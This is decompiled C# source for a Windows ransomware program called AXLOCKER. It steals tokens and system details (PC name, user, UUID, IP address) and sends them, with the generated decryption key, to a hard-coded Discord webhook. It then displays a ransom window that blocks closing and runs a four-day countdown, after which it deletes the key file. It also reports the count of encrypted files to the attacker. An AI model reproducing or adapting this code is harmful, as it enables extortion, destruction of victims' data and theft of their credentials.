using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using AXLCOKER;

namespace AXLOCKER;

public class AXLOCKER : Form
{
	public static string WEBHOOK = "https://discord.com/api/webhooks/1039930467614478378/N2J80EuPMXSWuIBpizgDJ-75CB6gzTyFE72NQ0DJimbA7xriJVmtb14gUP3VCBBZ0AZR";

	private static Webhook ww = new Webhook(WEBHOOK);

	private int delay = 345600;

	private string hash = "rNoRd8mIyt5DvhW8uzsV";

	private IContainer components = null;

	private PictureBox pictureBox1;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private TextBox txtID;

	private Label label5;

	private Label lblTime;

	private Timer timer1;

	private Label label6;

	private PictureBox pictureBox2;

	public AXLOCKER()
	{
		InitializeComponent();
	}

	private void L9I51ORBYODP()
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
		StreamWriter streamWriter = new StreamWriter("C:\\\\Windows\\\\AppMon.txt");
		streamWriter.Write("ERROR, Private key was deleted.");
		streamWriter.Close();
		((Control)this).Hide();
		if (File.Exists("C:\\\\Windows\\\\winlog.txt"))
		{
			File.Delete("C:\\\\Windows\\\\winlog.txt");
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			char[] array = new char[842];
			Random random = new Random();
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = text[random.Next(text.Length)];
			}
			string text2 = new string(array);
			((Control)txtID).set_Text(text2);
			string text3 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			char[] array2 = new char[20];
			new Random();
			for (int j = 0; j < array2.Length; j++)
			{
				array2[j] = text3[random.Next(text3.Length)];
			}
			string text4 = new string(array2);
			string s = text4;
			List<string> list = Grabber.Grab();
			string text5 = "";
			foreach (string item in list)
			{
				text5 = text5 + item + "\n";
			}
			List<string> details = User.GetDetails();
			string identifier = User.GetIdentifier();
			string iP = User.GetIP();
			Webhook webhook = new Webhook(WEBHOOK);
			webhook.Send("**Program executed** ```Status: Active \nPC Name: " + details[0] + "\nUser:" + details[1] + "\nUUID: " + identifier + "\nIP Address: " + iP + "```");
			webhook.Send("```Decryption Key: " + text4 + "\nUser ID: " + text2 + "```");
			webhook.Send("```Tokens:\n" + text5 + "```");
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			using MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(hash));
			using TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider
			{
				Key = key,
				Mode = CipherMode.ECB,
				Padding = PaddingMode.PKCS7
			};
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
			byte[] array3 = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
			string value = Convert.ToBase64String(array3, 0, array3.Length);
			StreamWriter streamWriter2 = new StreamWriter("C:\\\\Windows\\\\winlog.txt");
			streamWriter2.Write(value);
			streamWriter2.Close();
			timer1.Start();
			((Control)this).Show();
			webhook.Send($"```Files encrypted, file count: {Program.count}```");
			return;
		}
		string text6 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		char[] array4 = new char[842];
		Random random2 = new Random();
		for (int k = 0; k < array4.Length; k++)
		{
			array4[k] = text6[random2.Next(text6.Length)];
		}
		string text7 = new string(array4);
		((Control)txtID).set_Text(text7);
		string text8 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		char[] array5 = new char[20];
		new Random();
		for (int l = 0; l < array5.Length; l++)
		{
			array5[l] = text8[random2.Next(text8.Length)];
		}
		string text9 = new string(array5);
		string s2 = text9;
		List<string> list2 = Grabber.Grab();
		string text10 = "";
		foreach (string item2 in list2)
		{
			text10 = text10 + item2 + "\n";
		}
		List<string> details2 = User.GetDetails();
		string identifier2 = User.GetIdentifier();
		string iP2 = User.GetIP();
		Webhook webhook2 = new Webhook(WEBHOOK);
		webhook2.Send("**Program executed** ```Status: Active \nPC Name: " + details2[0] + "\nUser: " + details2[1] + "\nUUID: " + identifier2 + "\nIP Address: " + iP2 + "```");
		webhook2.Send("```Decryption Key: " + text9 + "\nUser ID: " + text7 + "```");
		webhook2.Send("```Tokens:\n" + text10 + "```");
		byte[] bytes2 = Encoding.UTF8.GetBytes(s2);
		using MD5CryptoServiceProvider mD5CryptoServiceProvider2 = new MD5CryptoServiceProvider();
		byte[] key2 = mD5CryptoServiceProvider2.ComputeHash(Encoding.UTF8.GetBytes(hash));
		using TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider2 = new TripleDESCryptoServiceProvider
		{
			Key = key2,
			Mode = CipherMode.ECB,
			Padding = PaddingMode.PKCS7
		};
		ICryptoTransform cryptoTransform2 = tripleDESCryptoServiceProvider2.CreateEncryptor();
		byte[] array6 = cryptoTransform2.TransformFinalBlock(bytes2, 0, bytes2.Length);
		string value2 = Convert.ToBase64String(array6, 0, array6.Length);
		StreamWriter streamWriter3 = new StreamWriter("C:\\\\Windows\\\\winlog.txt");
		streamWriter3.Write(value2);
		streamWriter3.Close();
		timer1.Start();
		((Control)this).Show();
		webhook2.Send($"```Files encrypted, file count: {Program.count}```");
	}

	private void Label1_Click(object sender, EventArgs e)
	{
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (delay >= 0)
		{
			TimeSpan timeSpan = TimeSpan.FromSeconds(--delay);
			((Control)lblTime).set_Text(timeSpan.ToString("dd\\:hh\\:mm\\:ss"));
		}
		else
		{
			File.Delete("C:\\\\Windows\\\\winlog.txt");
		}
	}

	private void PictureBox2_Click(object sender, EventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		Clipboard.SetText(((Control)txtID).get_Text());
		MessageBox.Show("Your ID have been copied to clipboard.");
	}

	private void Label6_Click(object sender, EventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		Clipboard.SetText(((Control)txtID).get_Text());
		MessageBox.Show("Your ID have been copied to clipboard.");
	}

	private void AXLOCKER_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		((CancelEventArgs)(object)e).Cancel = true;
		MessageBox.Show("ERROR.");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_0203: Unknown result type (might be due to invalid IL or missing references)
		//IL_020d: Expected O, but got Unknown
		//IL_0296: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a0: Expected O, but got Unknown
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Expected O, but got Unknown
		//IL_0433: Unknown result type (might be due to invalid IL or missing references)
		//IL_043d: Expected O, but got Unknown
		//IL_04c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d0: Expected O, but got Unknown
		//IL_0580: Unknown result type (might be due to invalid IL or missing references)
		//IL_058a: Expected O, but got Unknown
		//IL_061f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0629: Expected O, but got Unknown
		//IL_07b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c2: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(AXLOCKER));
		pictureBox1 = new PictureBox();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		txtID = new TextBox();
		label5 = new Label();
		lblTime = new Label();
		timer1 = new Timer(components);
		label6 = new Label();
		pictureBox2 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(0, 0));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(270, 254));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 10.2f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(12, 282));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(723, 180));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text(componentResourceManager.GetString("label1.Text"));
		((Control)label1).add_Click((EventHandler)Label1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 28.2f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(444, 27));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(291, 55));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("WARNING!!");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 10.2f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(460, 82));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(256, 20));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("Private key will be deleted in:");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 10.2f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.White);
		((Control)label4).set_Location(new Point(12, 477));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(670, 80));
		((Control)label4).set_TabIndex(4);
		((Control)label4).set_Text(componentResourceManager.GetString("label4.Text"));
		((Control)txtID).set_Location(new Point(24, 619));
		((TextBoxBase)txtID).set_Multiline(true);
		((Control)txtID).set_Name("txtID");
		((TextBoxBase)txtID).set_ReadOnly(true);
		txtID.set_ScrollBars((ScrollBars)2);
		((Control)txtID).set_Size(new Size(718, 184));
		((Control)txtID).set_TabIndex(5);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Yellow);
		((Control)label5).set_Location(new Point(19, 577));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(251, 25));
		((Control)label5).set_TabIndex(6);
		((Control)label5).set_Text("Your unique personal ID:");
		((Control)lblTime).set_AutoSize(true);
		((Control)lblTime).set_Font(new Font("Microsoft Sans Serif", 28.2f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblTime).set_ForeColor(Color.Yellow);
		((Control)lblTime).set_Location(new Point(445, 116));
		((Control)lblTime).set_Name("lblTime");
		((Control)lblTime).set_Size(new Size(290, 55));
		((Control)lblTime).set_TabIndex(7);
		((Control)lblTime).set_Text("00:00:00:00");
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)Timer1_Tick);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.Aqua);
		((Control)label6).set_Location(new Point(227, 822));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(256, 25));
		((Control)label6).set_TabIndex(8);
		((Control)label6).set_Text("Copy your ID to clipboard");
		((Control)label6).add_Click((EventHandler)Label6_Click);
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(489, 813));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(39, 37));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(9);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox2).add_Click((EventHandler)PictureBox2_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(759, 856));
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)lblTime);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)txtID);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_Name("AXLOCKER");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(AXLOCKER_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
